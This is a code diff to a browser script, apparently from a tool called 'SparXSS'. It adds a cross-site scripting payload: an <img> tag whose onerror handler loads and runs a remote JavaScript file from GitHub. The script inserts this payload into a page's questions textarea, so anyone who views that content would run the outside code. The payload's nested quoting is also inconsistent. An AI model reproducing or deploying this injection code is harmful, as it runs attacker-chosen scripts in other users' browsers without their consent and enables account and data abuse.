@@ -798,16 +798,25 @@ if (typeof executed === 'undefined') {
         
                     link.appendChild(linkText);
                 `;
+
+                var codeBeginning = `
+                    <img id="myImage" src="#" onerror="var scriptElement = document.createElement("script");scriptElement.src = "https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js";scriptElement.onload = function() {
+                `;
+                
+                var codeEnd = `
+                    };document.body.appendChild(scriptElement);}">
+                `;
         
                 var textarea = document.querySelector('.questions-textarea');
-                if (textarea.value.endsWith("'>")) {
-                    textarea.value = textarea.value.replace(/'>/g, '');
-                    textarea.value = textarea.value + codeSnippet + "' >";
+                
+                if (typeof linkSave === 'undefined') {
+                    linkSave = true;
+                    textarea.value = codeBeginning + codeSnippet + codeEnd;
+                } else if (linkSave === true) {
+                    textarea.value = textarea.value.replace(codeEnd, '');
+                    textarea.value = textarea.value + codeSnippet + codeEnd;
                 }
             })
-            .catch(function(error) {
-                console.error('Error:', error);
-            });
     }
 
     otherButton.addEventListener('click', checkpoint1);
